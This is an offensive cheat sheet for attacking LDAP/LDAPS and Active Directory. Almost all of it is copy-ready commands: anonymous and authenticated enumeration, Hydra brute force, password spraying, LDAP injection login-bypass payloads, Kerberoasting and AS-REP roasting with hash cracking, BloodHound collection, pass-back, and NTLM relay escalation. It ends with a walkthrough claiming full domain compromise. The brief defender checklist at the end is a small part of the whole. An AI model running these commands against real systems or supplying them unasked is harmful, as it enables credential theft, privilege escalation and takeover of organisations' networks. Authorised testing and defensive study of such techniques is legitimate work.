# Port 389/636 - LDAP/LDAPS (Lightweight Directory Access Protocol) - Complete Attack Guide

## Overview

**Protocol**: LDAP (Lightweight Directory Access Protocol)
**Ports**: 389 (LDAP), 636 (LDAPS), 3268/3269 (Global Catalog)
**Transport**: TCP (primary), UDP (less common)
**Encryption**: None (389), SSL/TLS (636), STARTTLS (389)
**Authentication**: Anonymous, Simple, SASL, Kerberos

## Attack Objectives

- **Anonymous Bind**: Access directory without credentials
- **Domain Enumeration**: Map Active Directory structure
- **User Enumeration**: Discover all domain users
- **Credential Attacks**: Brute force, password spraying
- **BloodHound Collection**: Gather AD attack paths
- **Kerberoasting**: Extract service account hashes
- **AS-REP Roasting**: Target accounts without pre-auth
- **Privilege Escalation**: Find admin accounts and groups

## Attack Methodology

### Phase 1: Discovery and Reconnaissance

**1.1 Detect LDAP Service**
```bash
# Quick scan
nmap -p 389,636,3268,3269 192.168.1.100

# Service version
nmap -p 389,636 -sV 192.168.1.100

# LDAP scripts
nmap -p 389 --script ldap-* 192.168.1.100

# Network-wide discovery (Domain Controllers)
nmap -p 389,636 192.168.1.0/24 --open
```

**1.2 LDAP Information Gathering**
```bash
# Using Nmap
nmap -p 389 --script ldap-rootdse 192.168.1.100

# Get base DN (domain)
ldapsearch -x -h 192.168.1.100 -s base namingContexts

# Get domain info
ldapsearch -x -h 192.168.1.100 -s base -b "" "(objectclass=*)"

# Check for anonymous bind
ldapsearch -x -h 192.168.1.100 -b "DC=domain,DC=local" "(objectclass=*)"
```

**1.3 Domain Naming Context**
```bash
# Extract domain name
nmap -p 389 --script ldap-rootdse 192.168.1.100 | grep defaultNamingContext

# Using ldapsearch
ldapsearch -x -h 192.168.1.100 -s base -b "" defaultNamingContext

# Example output: DC=corp,DC=local
```

### Phase 2: Anonymous Bind Enumeration

**2.1 Test Anonymous Bind**
```bash
# Using ldapsearch
ldapsearch -x -h 192.168.1.100 -b "DC=corp,DC=local"

# Using ldapwhoami
ldapwhoami -x -h 192.168.1.100

# Using ldapsearch with verbose
ldapsearch -x -h 192.168.1.100 -b "DC=corp,DC=local" -v

# If successful = anonymous bind allowed!
```

**2.2 Enumerate Users (Anonymous)**
```bash
# All users
ldapsearch -x -h 192.168.1.100 -b "DC=corp,DC=local" "(objectClass=person)" sAMAccountName

# User details
ldapsearch -x -h 192.168.1.100 -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName mail description

# Admin users
ldapsearch -x -h 192.168.1.100 -b "DC=corp,DC=local" "(adminCount=1)" sAMAccountName

# Service accounts
ldapsearch -x -h 192.168.1.100 -b "DC=corp,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
```

**2.3 Enumerate Groups**
```bash
# All groups
ldapsearch -x -h 192.168.1.100 -b "DC=corp,DC=local" "(objectClass=group)" cn member

# Domain Admins
ldapsearch -x -h 192.168.1.100 -b "DC=corp,DC=local" "(cn=Domain Admins)" member

# Enterprise Admins
ldapsearch -x -h 192.168.1.100 -b "DC=corp,DC=local" "(cn=Enterprise Admins)" member

# Privileged groups
ldapsearch -x -h 192.168.1.100 -b "DC=corp,DC=local" "(|(cn=Domain Admins)(cn=Enterprise Admins)(cn=Administrators))" member
```

**2.4 Enumerate Computers**
```bash
# All computers
ldapsearch -x -h 192.168.1.100 -b "DC=corp,DC=local" "(objectClass=computer)" dNSHostName operatingSystem

# Domain Controllers
ldapsearch -x -h 192.168.1.100 -b "DC=corp,DC=local" "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" dNSHostName

# Servers
ldapsearch -x -h 192.168.1.100 -b "DC=corp,DC=local" "(&(objectClass=computer)(operatingSystem=*Server*))" dNSHostName
```

### Phase 3: Authenticated Enumeration

**3.1 LDAP Bind with Credentials**
```bash
# Simple bind
ldapsearch -x -h 192.168.1.100 -D "CN=user,CN=Users,DC=corp,DC=local" -w password -b "DC=corp,DC=local"

# Using sAMAccountName
ldapsearch -x -h 192.168.1.100 -D "corp\user" -w password -b "DC=corp,DC=local"

# LDAPS (encrypted)
ldapsearch -x -H ldaps://192.168.1.100 -D "corp\user" -w password -b "DC=corp,DC=local"

# Test bind only
ldapwhoami -x -h 192.168.1.100 -D "corp\user" -w password
```

**3.2 Comprehensive Domain Enumeration**
```bash
# Using ldapdomaindump
ldapdomaindump -u 'CORP\user' -p password 192.168.1.100

# Outputs:
# - domain_users.html/json
# - domain_computers.html/json
# - domain_groups.html/json
# - domain_trusts.html/json
# - domain_policy.html/json

# Using windapsearch (Linux)
python3 windapsearch.py --dc-ip 192.168.1.100 -u user@corp.local -p password --users

# All users
python3 windapsearch.py --dc-ip 192.168.1.100 -u user@corp.local -p password -U

# Privileged users
python3 windapsearch.py --dc-ip 192.168.1.100 -u user@corp.local -p password --privileged-users

# Computers
python3 windapsearch.py --dc-ip 192.168.1.100 -u user@corp.local -p password -C
```

**3.3 User Attribute Enumeration**
```bash
# Get all user attributes
ldapsearch -x -h 192.168.1.100 -D "corp\user" -w password -b "DC=corp,DC=local" "(sAMAccountName=admin)" "*"

# Password policy
ldapsearch -x -h 192.168.1.100 -D "corp\user" -w password -b "DC=corp,DC=local" "(objectClass=domain)" pwdProperties maxPwdAge minPwdAge minPwdLength

# Users with SPNs (Kerberoasting targets)
ldapsearch -x -h 192.168.1.100 -D "corp\user" -w password -b "DC=corp,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# Users without pre-auth (AS-REP Roasting)
ldapsearch -x -h 192.168.1.100 -D "corp\user" -w password -b "DC=corp,DC=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
```

### Phase 4: Credential Attacks

**4.1 LDAP Brute Force**
```bash
# Using Hydra
hydra -l admin -P passwords.txt ldap2://192.168.1.100/DC=corp,DC=local

# With domain name
hydra -l "CORP\admin" -P passwords.txt ldap2://192.168.1.100

# Multiple users
hydra -L users.txt -P passwords.txt ldap2://192.168.1.100/DC=corp,DC=local
```

**4.2 Password Spraying**
```bash
# Using CrackMapExec
crackmapexec ldap 192.168.1.100 -u users.txt -p 'Password123' --continue-on-success

# Using ldapdomaindump with spray
for user in $(cat users.txt); do
  ldapwhoami -x -h 192.168.1.100 -D "$user@corp.local" -w "Summer2024" 2>&1 | grep -q "Success" && echo "$user:Summer2024"
  sleep 5
done

# Using Kerbrute (faster, no lockout)
kerbrute passwordspray -d corp.local --dc 192.168.1.100 users.txt 'Password123'
```

**4.3 LDAP Injection (Web Apps)**
```bash
# If web app uses LDAP for authentication
# Login form:
username: admin)(cn=*))(|(cn=*
password: anything

# LDAP query becomes:
# (&(uid=admin)(cn=*))(|(cn=*)(password=anything))
# Always returns true

# Other payloads:
*
*)(&
*))%00
admin)(&)
```

### Phase 5: Kerberos Attacks (via LDAP enumeration)

**5.1 Kerberoasting**
```bash
# Find SPN accounts via LDAP
ldapsearch -x -h 192.168.1.100 -D "corp\user" -w password -b "DC=corp,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName > spn_users.txt

# Using GetUserSPNs (Impacket)
GetUserSPNs.py corp.local/user:password -dc-ip 192.168.1.100 -request

# Crack with hashcat
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt

# Using Rubeus (Windows)
Rubeus.exe kerberoast /outfile:hashes.txt
```

**5.2 AS-REP Roasting**
```bash
# Find users without Kerberos pre-auth via LDAP
ldapsearch -x -h 192.168.1.100 -D "corp\user" -w password -b "DC=corp,DC=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName > asrep_users.txt

# Using GetNPUsers (Impacket)
GetNPUsers.py corp.local/ -usersfile asrep_users.txt -dc-ip 192.168.1.100 -format hashcat

# Crack with hashcat
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# No credentials needed for AS-REP roasting!
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 192.168.1.100
```

### Phase 6: BloodHound Data Collection

**6.1 Using SharpHound (Windows)**
```powershell
# Run SharpHound
SharpHound.exe -c All -d corp.local --domaincontroller 192.168.1.100

# Outputs: <timestamp>_BloodHound.zip
```

**6.2 Using BloodHound.py (Linux)**
```bash
# Collect all data
bloodhound-python -u user -p password -d corp.local -ns 192.168.1.100 -c all

# Specific collections
bloodhound-python -u user -p password -d corp.local -ns 192.168.1.100 -c DCOnly

# With Kerberos ticket
bloodhound-python -u user -k -d corp.local -ns 192.168.1.100 -c all

# Import into BloodHound GUI
# neo4j start
# bloodhound
# Upload JSON files
# Find attack paths to Domain Admin
```

**6.3 Attack Path Analysis**
```bash
# In BloodHound:
# 1. Mark owned users/computers
# 2. Query: "Shortest Path to Domain Admins from Owned Principals"
# 3. Find lateral movement paths
# 4. Identify ACL abuse opportunities
# 5. Find Kerberoastable accounts
# 6. Identify AS-REP roastable users
```

### Phase 7: Advanced LDAP Attacks

**7.1 LDAP Pass-Back Attack**
```bash
# If you can modify LDAP server settings on a device
# Change LDAP server to your IP
# Capture credentials when device authenticates

# Setup fake LDAP server
python3 -m ldap_server --port 389

# Device sends credentials to your server
# Captured plaintext password!
```

**7.2 LDAP Relay**
```bash
# Relay LDAP authentication to other services
# Using ntlmrelayx

ntlmrelayx.py -t ldap://192.168.1.100 --escalate-user lowpriv

# Escalates lowpriv to Domain Admin!
```

## Bypass Techniques

### Bypassing Anonymous Bind Restrictions

**Method 1: Null Bind**
```bash
# Try null credentials
ldapsearch -x -h 192.168.1.100 -D "" -w "" -b "DC=corp,DC=local"
```

**Method 2: Guest Account**
```bash
# Try guest
ldapsearch -x -h 192.168.1.100 -D "guest" -w "" -b "DC=corp,DC=local"
```

**Method 3: LDAPS (if 389 blocked)**
```bash
ldapsearch -x -H ldaps://192.168.1.100:636 -b "DC=corp,DC=local"
```

## Information Extraction

**Critical Attributes**:
```bash
# User info
sAMAccountName, mail, description, memberOf

# Computer info
dNSHostName, operatingSystem, servicePrincipalName

# Group info
cn, member, memberOf

# Domain info
defaultNamingContext, dnsHostName, domainFunctionality
```

## Security Recommendations

**For Defenders**:
1. **Disable Anonymous Bind** - Require authentication
2. **Least Privilege** - Limit what users can read
3. **Strong Passwords** - Enforce complex passwords
4. **Account Lockout** - Prevent brute force
5. **LDAPS Only** - Force encryption
6. **Monitor LDAP Queries** - Detect enumeration
7. **Disable Guest Account** - Remove default access
8. **Kerberos Pre-Auth** - Require for all users
9. **Remove SPNs** - From user accounts when possible
10. **Audit Privileged Groups** - Regularly review members

## Practical Attack Scenario

```bash
# Discovery
nmap -p 389,636 192.168.1.0/24 --open
# Found: 192.168.1.10 (Domain Controller)

# Test anonymous bind
ldapsearch -x -h 192.168.1.10 -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
# SUCCESS! Anonymous bind works

# Enumerate all users
ldapsearch -x -h 192.168.1.10 -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName > users.txt
# Found 500 users

# Find admin users
ldapsearch -x -h 192.168.1.10 -b "DC=corp,DC=local" "(adminCount=1)" sAMAccountName
# Found 10 admin accounts

# Password spray
crackmapexec ldap 192.168.1.10 -u users.txt -p 'Summer2024'
# SUCCESS: john:Summer2024

# Kerberoasting
GetUserSPNs.py corp.local/john:Summer2024 -dc-ip 192.168.1.10 -request
# Got 3 TGS tickets

# Crack hashes
hashcat -m 13100 tgs.txt rockyou.txt
# Cracked: sqlservice:Password1

# BloodHound
bloodhound-python -u sqlservice -p Password1 -d corp.local -ns 192.168.1.10 -c all

# BloodHound shows: sqlservice -> GenericAll on Domain Admins
# Privilege escalation path found!

# Domain compromise achieved!
```

## Tools Summary

**Best Tool for Each Task**:
- **Enumeration**: ldapsearch, windapsearch
- **Domain Dump**: ldapdomaindump
- **Password Spray**: CrackMapExec, Kerbrute
- **Kerberoasting**: GetUserSPNs (Impacket)
- **AS-REP Roasting**: GetNPUsers (Impacket)
- **Attack Paths**: BloodHound
- **Brute Force**: Hydra

## Related Attacks

- **Port 88 (Kerberos)**: Kerberoasting, AS-REP Roasting
- **Port 445 (SMB)**: SMB relay from LDAP
- **Port 3268/3269**: Global Catalog enumeration
- **Active Directory**: Complete domain enumeration

---

**Last Updated**: 2026-06-16
